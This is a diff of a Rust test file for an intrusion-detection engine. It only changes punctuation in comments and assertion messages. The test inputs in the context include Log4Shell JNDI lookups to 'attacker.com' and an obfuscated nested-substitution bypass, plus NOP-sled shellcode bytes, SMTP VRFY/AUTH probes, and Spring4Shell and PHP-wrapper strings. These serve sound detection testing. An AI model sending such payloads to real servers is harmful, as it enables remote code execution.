@@ -40,7 +40,7 @@ fn ips_engine() -> IdsEngine {
 #[test]
 fn test_nop_sled_actual_bytes_detected() {
     let engine = ids_engine();
-    // Craft payload with real 0x90 bytes — the kind a shellcode would contain
+    // Craft payload with real 0x90 bytes, the kind a shellcode would contain
     let mut payload = b"DATA\r\n".to_vec();
     payload.extend_from_slice(&[0x90u8; 16]); // 16 NOP bytes
     payload.extend_from_slice(b"\x31\xc0\x50\x68"); // dummy shellcode stub
@@ -58,14 +58,14 @@ fn test_nop_sled_actual_bytes_detected() {
 #[test]
 fn test_nop_sled_ascii_text_not_detected() {
     let engine = ids_engine();
-    // This is the TEXT string "\\x90\\x90\\x90\\x90" — NOT actual 0x90 bytes
+    // This is the TEXT string "\\x90\\x90\\x90\\x90", NOT actual 0x90 bytes
     let payload = b"DATA\r\n\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90";
 
     let (_, alerts) = engine.inspect(src_ip(), 25, "smtp", payload);
     let nop_alerts: Vec<_> = alerts.iter().filter(|a| a.id == 2000002).collect();
     assert!(
         nop_alerts.is_empty(),
-        "ASCII backslash-x90 text must NOT trigger binary NOP sled signature — P0 regression"
+        "ASCII backslash-x90 text must NOT trigger binary NOP sled signature, P0 regression"
     );
 }
 
@@ -187,7 +187,7 @@ fn test_ids_mode_never_drops() {
     assert_ne!(
         verdict,
         IdsVerdict::Drop,
-        "IDS mode must NEVER issue a Drop verdict — would silently block in detection-only deployment"
+        "IDS mode must NEVER issue a Drop verdict, would silently block in detection-only deployment"
     );
 }
 
@@ -212,7 +212,7 @@ fn test_clean_smtp_no_alerts() {
 // `vrfy admin` (lowercase) both bypassed detection entirely.
 // These tests would have FAILED (attack allowed through) before the patch.
 
-/// Log4Shell with ALL-UPPERCASE JNDI — previously bypassed `${jndi:` pattern.
+/// Log4Shell with ALL-UPPERCASE JNDI, previously bypassed `${jndi:` pattern.
 #[test]
 fn test_log4shell_uppercase_jndi_blocked() {
     let engine = ids_engine();
@@ -220,7 +220,7 @@ fn test_log4shell_uppercase_jndi_blocked() {
     let (_, alerts) = engine.inspect(src_ip(), 8080, "http", payload);
     assert!(
         !alerts.is_empty(),
-        "`${{JNDI:ldap://...}}` uppercase JNDI must be detected — case-sensitivity regression"
+        "`${{JNDI:ldap://...}}` uppercase JNDI must be detected, case-sensitivity regression"
     );
     assert!(
         alerts.iter().any(|a| a.id == 2000012),
@@ -229,7 +229,7 @@ fn test_log4shell_uppercase_jndi_blocked() {
     );
 }
 
-/// Log4Shell mixed-case `${JnDi:rmi://...}` — must also fire.
+/// Log4Shell mixed-case `${JnDi:rmi://...}`, must also fire.
 #[test]
 fn test_log4shell_mixedcase_jndi_blocked() {
     let engine = ids_engine();
@@ -237,7 +237,7 @@ fn test_log4shell_mixedcase_jndi_blocked() {
     let (_, alerts) = engine.inspect(src_ip(), 443, "https", payload);
     assert!(
         !alerts.is_empty(),
-        "`${{JnDi:rmi://...}}` mixed-case JNDI must be detected — case-sensitivity regression"
+        "`${{JnDi:rmi://...}}` mixed-case JNDI must be detected, case-sensitivity regression"
     );
 }
 
@@ -247,7 +247,7 @@ fn test_log4shell_mixedcase_jndi_blocked() {
 #[test]
 fn test_log4shell_raw_jndi_ldap_no_wrapper_detected() {
     let engine = ids_engine();
-    // Raw JNDI URL — no `${...}` prefix. SID 2000012 requires `${jndi:` so only
+    // Raw JNDI URL, no `${...}` prefix. SID 2000012 requires `${jndi:` so only
     // SID 2000017 (pattern `jndi:ldap://`) fires here.
     let payload = b"GET /?redirect=jndi:ldap://attacker.com/exploit HTTP/1.1\r\n";
     let (_, alerts) = engine.inspect(src_ip(), 80, "http", payload);
@@ -269,7 +269,7 @@ fn test_log4shell_raw_jndi_ldap_no_wrapper_detected() {
 #[test]
 fn test_log4shell_deeply_obfuscated_known_bypass() {
     let engine = ids_engine();
-    // `${j${::-n}di:ldap://...}` — nested substitution obfuscation
+    // `${j${::-n}di:ldap://...}`, nested substitution obfuscation
     let payload = b"GET /?x=${j${::-n}di:ldap://attacker.com/x} HTTP/1.1\r\n";
     let (_, alerts) = engine.inspect(src_ip(), 80, "http", payload);
     let fired_sids: Vec<u32> = alerts.iter().map(|a| a.id).collect();
@@ -285,7 +285,7 @@ fn test_log4shell_deeply_obfuscated_known_bypass() {
 #[test]
 fn test_log4shell_raw_jndi_iiop_detected() {
     let engine = ids_engine();
-    // Plain JNDI IIOP URL — tests that SID 2000017 also covers non-ldap protocols.
+    // Plain JNDI IIOP URL, tests that SID 2000017 also covers non-ldap protocols.
     let payload = b"X-Forwarded-For: jndi:iiop://10.0.0.1:1099/malicious-object\r\n";
     let (_, alerts) = engine.inspect(src_ip(), 443, "https", payload);
     assert!(
@@ -299,7 +299,7 @@ fn test_log4shell_raw_jndi_iiop_detected() {
     );
 }
 
-/// VRFY all-lowercase — previously bypassed `VRFY ` (uppercase) pattern.
+/// VRFY all-lowercase, previously bypassed `VRFY ` (uppercase) pattern.
 #[test]
 fn test_smtp_vrfy_lowercase_detected() {
     let engine = ids_engine();
@@ -307,7 +307,7 @@ fn test_smtp_vrfy_lowercase_detected() {
     let (_, alerts) = engine.inspect(src_ip(), 25, "smtp", payload);
     assert!(
         !alerts.is_empty(),
-        "`vrfy admin` lowercase must be detected — case-sensitivity regression"
+        "`vrfy admin` lowercase must be detected, case-sensitivity regression"
     );
     assert!(
         alerts.iter().any(|a| a.id == 2000003),
@@ -316,7 +316,7 @@ fn test_smtp_vrfy_lowercase_detected() {
     );
 }
 
-/// VRFY mixed-case `Vrfy` — must also match.
+/// VRFY mixed-case `Vrfy`, must also match.
 #[test]
 fn test_smtp_vrfy_mixedcase_detected() {
     let engine = ids_engine();
@@ -324,11 +324,11 @@ fn test_smtp_vrfy_mixedcase_detected() {
     let (_, alerts) = engine.inspect(src_ip(), 25, "smtp", payload);
     assert!(
         !alerts.is_empty(),
-        "`Vrfy root` mixed-case must be detected — case-sensitivity regression"
+        "`Vrfy root` mixed-case must be detected, case-sensitivity regression"
     );
 }
 
-/// AUTH PLAIN lowercase — previously bypassed `AUTH PLAIN ` uppercase pattern.
+/// AUTH PLAIN lowercase, previously bypassed `AUTH PLAIN ` uppercase pattern.
 #[test]
 fn test_smtp_auth_plain_lowercase_detected() {
     let engine = ids_engine();
@@ -337,11 +337,11 @@ fn test_smtp_auth_plain_lowercase_detected() {
     let (_, alerts) = engine.inspect(src_ip(), 587, "smtp", payload);
     assert!(
         !alerts.is_empty(),
-        "`auth plain ...` lowercase AUTH PLAIN must be detected — case-sensitivity regression"
+        "`auth plain ...` lowercase AUTH PLAIN must be detected, case-sensitivity regression"
     );
 }
 
-/// Spring4Shell all-uppercase `CLASS.MODULE.CLASSLOADER` — previously bypassed.
+/// Spring4Shell all-uppercase `CLASS.MODULE.CLASSLOADER`, previously bypassed.
 #[test]
 fn test_spring4shell_uppercase_detected() {
     let engine = ids_engine();
@@ -349,7 +349,7 @@ fn test_spring4shell_uppercase_detected() {
     let (_, alerts) = engine.inspect(src_ip(), 8080, "http", payload);
     assert!(
         !alerts.is_empty(),
-        "`CLASS.MODULE.CLASSLOADER` uppercase must be detected — case-sensitivity regression"
+        "`CLASS.MODULE.CLASSLOADER` uppercase must be detected, case-sensitivity regression"
     );
     assert!(
         alerts.iter().any(|a| a.id == 2000013),
@@ -358,7 +358,7 @@ fn test_spring4shell_uppercase_detected() {
     );
 }
 
-/// PHP stream wrapper `PHP://INPUT` uppercase — previously bypassed.
+/// PHP stream wrapper `PHP://INPUT` uppercase, previously bypassed.
 #[test]
 fn test_php_stream_wrapper_uppercase_detected() {
     let engine = ids_engine();
@@ -366,7 +366,7 @@ fn test_php_stream_wrapper_uppercase_detected() {
     let (_, alerts) = engine.inspect(src_ip(), 80, "http", payload);
     assert!(
         !alerts.is_empty(),
-        "`PHP://INPUT` uppercase php:// stream must be detected — case-sensitivity regression"
+        "`PHP://INPUT` uppercase php:// stream must be detected, case-sensitivity regression"
     );
 }
 
